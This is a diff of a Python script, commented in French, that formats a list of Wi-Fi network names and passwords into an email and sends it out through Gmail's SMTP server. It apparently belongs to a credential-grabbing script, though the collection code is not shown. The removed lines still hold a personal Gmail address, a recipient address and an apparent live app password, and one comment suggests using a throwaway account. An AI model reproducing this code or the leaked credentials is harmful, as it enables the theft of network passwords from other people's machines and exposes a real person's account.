@@ -57,25 +57,26 @@ email_message = ""
 for item in wifi_list:
     email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
 
-print(email_message)
-
 # Create EmailMessage Object
 email = EmailMessage()
 # Who is the email from
-email["from"] = "JLD"
+email["from"] = "Emetteur"
 # To which email you want to send the email
-email["to"] = "jerome.ledorze@gmail.com"
+email["to"] = "@email du destinataire"
 # Subject of the email
-email["subject"] = "Test pour voir"
+email["subject"] = "Libelle du mail"
 email.set_content(email_message)
 
 # Create smtp server TLS:587 /SSL: 465
+# Attention, pour Gmail il faut obtenir un mot de passe messagerie pour application
+# ON evite ainsi l'authetification en 2 étapes.
+# C'est pas surper secure à garde mais c'est le seul moyen --> on peut le faire avec un compte junk
 with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
     smtp.ehlo()
     # Connect securely to server
     smtp.starttls()
     # Login using username and password to dummy email. Remember to set email to allow less secure apps if using Gmail
-    smtp.login('me.loupbois@gmail.com', '7_4-FyOkyfOtbmg7jUDSo_Prmv1p7S')
+    smtp.login("compte gmail - adresse email", "password_d'application")
     # Send email.
     smtp.send_message(email)
     smtp.quit()
